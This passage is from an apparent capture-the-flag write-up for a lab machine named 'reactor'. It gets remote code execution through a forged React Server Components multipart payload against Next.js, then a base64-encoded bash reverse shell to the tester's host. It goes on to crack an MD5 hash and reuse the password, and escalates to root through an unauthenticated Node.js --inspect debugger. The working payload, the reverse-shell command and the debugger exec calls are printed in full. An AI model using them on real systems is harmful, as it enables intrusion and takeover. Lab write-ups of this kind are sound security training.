Now I can send that with `curl` using the following arguments:

-   `-H "Next-Action: 0xdf"` - The `Next-Action` header to trigger the parsing.
-   `-H "Content-Type: multipart/form-data; boundary=----R2S"` - Setting the request to form data with the boundary I used in the payload.
-   `--data-binary @r2s-body.txt` - The body to send. `@` is used to load the contents of a file.
-   `--max-time 1` - Success will hang the response, as the forged thenable never resolves and React waits on it forever. This just kills the request after 1 second (not required).

```
oxdf@hacky$ curl --max-time 1 -X POST http://10.129.91.79:3000/ -H "Next-Action: 0xdf" -H "Content-Type: multipart/form-data; boundary=----R2S" --data-binary @r2s-body.txt
curl: (28) Operation timed out after 1002 milliseconds with 0 bytes received
```

It dies by timeout, but at `tcpdump`, I get a hit:

```bash
oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:25:17.550828 IP 10.129.91.79 > 10.10.15.169: ICMP echo request, id 6460, seq 1, length 64
13:25:17.550863 IP 10.10.15.169 > 10.129.91.79: ICMP echo reply, id 6460, seq 1, length 64
```

That’s RCE!

### Shell

I’ll update the payload with a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw). To avoid quoting issues, I’ll base64-encode it. The encoded string can still come out with `+` and `/` in it, and those are the two characters most at risk of getting mangled anywhere the body is handled as URL-encoded form data, where a `+` decodes to a space and quietly corrupts the blob. It costs nothing to avoid them. Adding a space to the command shifts the byte alignment, which changes the base64 output, so I’ll keep adding spaces until neither character shows up:

```bash
oxdf@hacky$ echo 'bash -i >& /dev/tcp/10.10.15.169/443 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xNjkvNDQzIDA+JjEK
oxdf@hacky$ echo 'bash  -i >& /dev/tcp/10.10.15.169/443 0>&1' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTY5LzQ0MyAwPiYxCg==
oxdf@hacky$ echo 'bash  -i >& /dev/tcp/10.10.15.169/443 0>&1 ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTY5LzQ0MyAwPiYxIAo=
oxdf@hacky$ echo 'bash  -i >& /dev/tcp/10.10.15.169/443 0>&1  ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTY5LzQ0MyAwPiYxICAK
```

The last one is clean, so that’s the one I’ll use.

Now I’ll update the payload:

```powershell
------R2S
Content-Disposition: form-data; name="0"

"$1"
------R2S
Content-Disposition: form-data; name="1"

{"status": "resolved_model", "reason": 0, "_response": "$5", "value": "{\"then\": \"$4:map\", \"0\": {\"then\": \"$B3\"}, \"length\": 1}", "then": "$2:then"}
------R2S
Content-Disposition: form-data; name="2"

"$@3"
------R2S
Content-Disposition: form-data; name="3"

""
------R2S
Content-Disposition: form-data; name="4"

[]
------R2S
Content-Disposition: form-data; name="5"

{"_prefix": "process.mainModule.require('child_process').execSync('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTY5LzQ0MyAwPiYxICAK | base64 -d | bash')//", "_formData": {"get": "$4:constructor:constructor"}, "_chunks": "$2:_response:_chunks", "_bundlerConfig": {}}
------R2S--
```

And with `nc` listening, send it:

```
oxdf@hacky$ curl --max-time 1 -X POST http://10.129.91.79:3000/ -H "Next-Action: 0xdf" -H "Content-Type: multipart/form-data; boundary=----R2S" --data-binary @r2s-shell.txt
curl: (28) Operation timed out after 1002 milliseconds with 0 bytes received
```

At my listening `nc`:

```ruby
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.91.79 36186
bash: cannot set terminal process group (1394): Inappropriate ioctl for device
bash: no job control in this shell
node@reactor:/opt/reactor-app$
```

I’ll upgrade my shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```ruby
node@reactor:/opt/reactor-app$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
node@reactor:/opt/reactor-app$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            ‍reset
reset: unknown terminal type unknown
Terminal type? screen
node@reactor:/opt/reactor-app$
```

## Shell as engineer

### Enumeration

#### Users

The node user’s home directory is very empty:

```sql
node@reactor:~$ ls -la
total 20
drwxr-x--- 2 node node 4096 May 18 11:40 .
drwxr-xr-x 4 root root 4096 May 18 11:40 ..
lrwxrwxrwx 1 root root    9 May 18 10:38 .bash_history -> /dev/null
-rw-r--r-- 1 node node  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 node node 3771 Mar 31  2024 .bashrc
-rw-r--r-- 1 node node  807 Mar 31  2024 .profile
```

Trying to run `sudo` prompts for a password that I don’t have:

```
node@reactor:~$ sudo -l
[sudo] password for node:
```

There’s one other user with a home directory in `/home`, engineer:

```
node@reactor:/home$ ls
engineer  node
```

engineer and root are the only users with shells set in `passwd`:

```bash
node@reactor:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
engineer:x:1000:1000:engineer:/home/engineer:/bin/bash
```

#### Filesystem

`/opt` has two directories in it:

```
node@reactor:/opt$ ls
reactor-app  uptime-monitor
```

I’ll come back to `uptime-monitor` later. `reactor-app` is the website code:

```ruby
node@reactor:/opt/reactor-app$ ls
app  next.config.js  node_modules  package.json  package-lock.json  reactor.db
```

`app` shows that the site is three files:

```ruby
node@reactor:/opt/reactor-app$ ls app/
globals.css  layout.js  page.js
```

`reactor.db` is very weird. There’s no feature on the site that I found that would use a DB. `package.json` doesn’t show any database driver in the app:

```json
{
  "name": "reactor-app",
  "version": "3.2.1",
  "private": true,
  "scripts": {
    "dev": "next dev",
    "build": "next build",
    "start": "next start -p 3000"
  },
  "dependencies": {
    "next": "15.0.3",
    "react": "19.0.0",
    "react-dom": "19.0.0"
  }
}
```

I would expect to see the `sqlite3` package or some more advanced database ORM.

#### Database

The database has two tables:

```ruby
node@reactor:/opt/reactor-app$ sqlite3 reactor.db 
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
sensor_logs  users
```

`sensor_logs` isn’t interesting:

```
sqlite> .headers on
sqlite> select * from sensor_logs; 
id|timestamp|sensor_id|reading|status
1|2025-12-28 14:32:01|CORE_TEMP_01|324.5|NOMINAL
2|2025-12-28 14:32:01|PRESSURE_01|155.2|NOMINAL
3|2025-12-28 14:32:01|COOLANT_FLOW|18.4|CAUTION
```

It seems like maybe the site was supposed to read from this DB, but whoever built it got lazy and hardcoded the values instead.

`users` has two rows:

```
sqlite> select * from users; 
id|username|password_hash|role|email
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

These are also not used by the site.

### su / SSH

The hashes are 32 hex characters, which suggests MD5. I’ll throw both at [CrackStation](https://crackstation.net/), and only engineer’s cracks:

![image-20260924102532455](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/e1d98eaa1e984523.png)

![image-20260924102532455](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260924102532455.webp)

That’s an application password, but engineer reused it for their system account, so it works with `su`:

```
node@reactor:/$ su - engineer
Password: 
engineer@reactor:~$
```

It also works over SSH:

```sql
oxdf@hacky$ sshpass -p reactor1 ssh engineer@10.129.91.79
 ____  _____    _    ____ _____ ___  ____  
|  _ \| ____|  / \  / ___|_   _/ _ \|  _ \ 
| |_) |  _|   / _ \| |     | || | | | |_) |
|  _ <| |___ / ___ \ |___  | || |_| |  _ < 
|_| \_\_____/_/   \_\____| |_| \___/|_| \_\

    ReactorWatch Core Monitoring System
    Nuclear Dynamics Corp. - Site 7
    
    AUTHORIZED PERSONNEL ONLY
Last login: Thu Sep 24 23:26:12 2026 from 10.10.15.169
engineer@reactor:~$
```

And I can grab `user.txt`:

```
engineer@reactor:~$ cat user.txt
b9ffa3bf************************
```

## Shell as root

### Enumeration

#### User

engineer’s home directory is pretty empty:

```sql
engineer@reactor:~$ ls -la
total 36
drwxr-x--- 4 engineer engineer 4096 May 20 10:12 .
drwxr-xr-x 4 root     root     4096 May 18 11:40 ..
-rw------- 1 engineer engineer    0 May 20 10:12 .bash_history
-rw-r--r-- 1 engineer engineer  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 engineer engineer 3771 Mar 31  2024 .bashrc
drwx------ 2 engineer engineer 4096 May 18 11:40 .cache
-rw------- 1 engineer engineer   20 Dec 28  2025 .lesshst
-rw-r--r-- 1 engineer engineer  807 Mar 31  2024 .profile
drwx------ 2 engineer engineer 4096 May 18 11:40 .ssh
-rw-r--r-- 1 engineer engineer    0 Dec 28  2025 .sudo_as_admin_successful
-rw-r----- 1 root     engineer   33 Sep 23 01:16 user.txt
```

It looks like in December they were able to `sudo` successfully, but that has since been revoked:

```
engineer@reactor:~$ sudo -l
[sudo] password for engineer: 
Sorry, user engineer may not run sudo on reactor.
```

#### uptime-monitor

`/opt/uptime-monitor` has a single JavaScript file:

```ruby
engineer@reactor:/opt/uptime-monitor$ ls
worker.js
```

This file has the following basic structure:

```javascript
const http = require('http');
const fs = require('fs');

const TARGET_URL = 'http://127.0.0.1:3000/';
const CSV_FILE = '/var/log/uptime-monitor.csv';
const INTERVAL_MS = 30_000;
const TIMEOUT_MS = 10_000;

function csvEscape(value) {
    const s = String(value ?? '');
    return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

function record({ status, latency, size, error }) {
    ...[snip]...
}

function probe() {
    ...[snip]...
}

setInterval(probe, INTERVAL_MS);
probe();

console.log('uptime-monitor up, pid=' + process.pid);
```

It runs `probe` every 30 seconds, and immediately on start.

`probe` is the main function:

```javascript
function probe() {
    const start = process.hrtime.bigint();
    let bytes = 0;

    const req = http.get(TARGET_URL, { timeout: TIMEOUT_MS }, (res) => {
        res.on('data', (chunk) => {
            bytes += chunk.length;
        });

        res.on('end', () => {
            const latencyMs = Number(
                (process.hrtime.bigint() - start) / 1_000_000n
            );

            record({
                status: res.statusCode,
                latency: latencyMs,
                size: bytes,
            });
        });
    });

    req.on('error', (error) => {
        const latencyMs = Number(
            (process.hrtime.bigint() - start) / 1_000_000n
        );

        record({
            latency: latencyMs,
            error: error.code || error.message,
        });
    });

    req.on('timeout', () => {
        req.destroy();

        record({
            latency: TIMEOUT_MS,
            error: 'TIMEOUT',
        });
    });
}
```

It makes a request to the website on 3000 and passes the results to the `record` method:

```javascript
function record({ status, latency, size, error }) {
    const row = [
        new Date().toISOString(),
        status ?? '',
        latency ?? '',
        size ?? '',
        error ?? '',
    ]
        .map(csvEscape)
        .join(',') + '\n';

    fs.appendFileSync(CSV_FILE, row);
}
```

`record` writes the results to a CSV file in `/var/log`. Nothing in here is exploitable.

The log is long, and still running:

```
engineer@reactor:/$ wc -l /var/log/uptime-monitor.csv
4794 /var/log/uptime-monitor.csv
engineer@reactor:/$ tail /var/log/uptime-monitor.csv
2026-09-25T00:54:44.691Z,,10000,,TIMEOUT
2026-09-25T00:54:44.691Z,,10005,,ECONNRESET
2026-09-25T00:55:14.705Z,,10000,,TIMEOUT
2026-09-25T00:55:14.705Z,,10005,,ECONNRESET
2026-09-25T00:55:44.726Z,,10000,,TIMEOUT
2026-09-25T00:55:44.726Z,,10005,,ECONNRESET
2026-09-25T00:56:14.746Z,,10000,,TIMEOUT
2026-09-25T00:56:14.746Z,,10005,,ECONNRESET
2026-09-25T00:56:44.757Z,,10000,,TIMEOUT
2026-09-25T00:56:44.758Z,,10006,,ECONNRESET
```

This process is running via `node`:

```
engineer@reactor:/$ ps auxww | grep worker.js
root        1396  0.0  1.2 1067424 49020 ?       Ssl  Sep23   0:07 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

It’s running as root, and it’s using the `--inspect` argument pointing at port 9229. I’ll confirm this with `netstat`:

```ruby
engineer@reactor:~$ netstat -tnlp
(No info could be read for "-p": geteuid()=1000 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9229          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp6     313      0 :::3000                 :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

### Node JS Inspector

#### Background

`--inspect` is using NodeJS’ [Inspector](https://nodejs.org/api/inspector.html) capabilities, the debugger interface built into the V8 engine. It uses the [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/) (CDP) over a WebSocket, allowing tools like Chrome’s DevTools, VS Code, and NodeJS’ own `node inspect` command line client to attach to a running process. `--inspect` is the flag that opens the port on the target process, and `node inspect host:port` is the client that connects to one that’s already open. CDP provides both read and write access to the process, and includes `Runtime.evaluate` ([docs](https://chromedevtools.github.io/devtools-protocol/tot/Runtime/#method-evaluate)), which executes arbitrary JavaScript inside the target process.

There’s no authentication on any of this. The only thing protecting the debugger is that it’s bound to localhost, so anyone who can reach port 9229 can run code inside the process, which in this case is running as root.

#### Inspect Enumeration

I’ll get information about the available inspect instances at the `/json/list` endpoint:

```ruby
engineer@reactor:~$ curl localhost:9229/json/list
[ {
  "description": "node.js instance",
  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=localhost:9229/f36940bd-09d1-46c6-b3f4-74c575af3d6d",
  "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=localhost:9229/f36940bd-09d1-46c6-b3f4-74c575af3d6d",
  "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
  "id": "f36940bd-09d1-46c6-b3f4-74c575af3d6d",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node",
  "url": "file:///opt/uptime-monitor/worker.js",
  "webSocketDebuggerUrl": "ws://localhost:9229/f36940bd-09d1-46c6-b3f4-74c575af3d6d"
} ]
```

There’s only one, and it’s `worker.js`.

#### RCE via Chromium

I’ll create a tunnel to port 9229 using SSH by reconnecting with `-L 9229:localhost:9229`. Now I’ll open up Chromium and visit `chrome://inspect`:

![image-20260924122439931](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/7d2338ce1ce898ec.png)

![image-20260924122439931](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260924122439931.webp)

`worker.js` is there! Clicking “inspect” opens a new window at a console in the process:

![image-20260924122540991](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/408913ec3576afe4.png)

![image-20260924122540991](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260924122540991.webp)

I can use the same JavaScript I used in the foothold payload, and this time it’s not blind. Still, the results aren’t clear, as `execSync` hands back a Buffer, which the console renders as raw bytes:

![image-20260924122937860](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/cc33b052e2701bf0.png)

![image-20260924122937860](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260924122937860.webp)

`.toString()` fixes that:

![image-20260924122947236](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8c755d7ee356350b.png)

![image-20260924122947236](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260924122947236.webp)

I can read the flag:

![image-20260924123017666](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8b50f18e50523961.png)

![image-20260924123017666](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260924123017666.webp)

I can also get a shell. I’ll write my public SSH key into `/tmp/key` from the engineer shell, rather than pasting it into the DevTools console where the quoting gets fiddly:

```
engineer@reactor:~$ cat /tmp/key 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing
```

And copy it into root’s `authorized_keys` file:

![image-20260924123126542](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/15a5710bd311f9d8.png)

![image-20260924123126542](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260924123126542.webp)

Now I can get a shell as root:

```sql
oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@10.129.91.79
 ____  _____    _    ____ _____ ___  ____  
|  _ \| ____|  / \  / ___|_   _/ _ \|  _ \ 
| |_) |  _|   / _ \| |     | || | | | |_) |
|  _ <| |___ / ___ \ |___  | || |_| |  _ < 
|_| \_\_____/_/   \_\____| |_| \___/|_| \_\

    ReactorWatch Core Monitoring System
    Nuclear Dynamics Corp. - Site 7
    
    AUTHORIZED PERSONNEL ONLY
Last login: Fri Sep 25 01:31:39 2026 from 10.10.15.169
root@reactor:~#
```

And grab the root flag:

```
root@reactor:~# cat root.txt
d25f48c9************************
```

#### RCE via node

I can also connect to the Inspector debug via the `node` binary at the command line:

```
engineer@reactor:~$ node inspect 127.0.0.1:9229
connecting to 127.0.0.1:9229 ... ok
debug> exec("process.mainModule.require('child_process').execSync('id').toString()")
'uid=0(root) gid=0(root) groups=0(root)\n'
```

In fact, I could skip engineer entirely. From the node user, I can see the process list:

```
node@reactor:/$ ps auxww | grep 9229
root        1385  0.0  1.1 1066468 43816 ?       Ssl  01:55   0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

That’s enough to see a path to root:

```
node@reactor:/$ node inspect 127.0.0.1:9229
connecting to 127.0.0.1:9229 ... ok
debug> exec("process.mainModule.require('child_process').execSync('id').toString()")
'uid=0(root) gid=0(root) groups=0(root)\n'
```
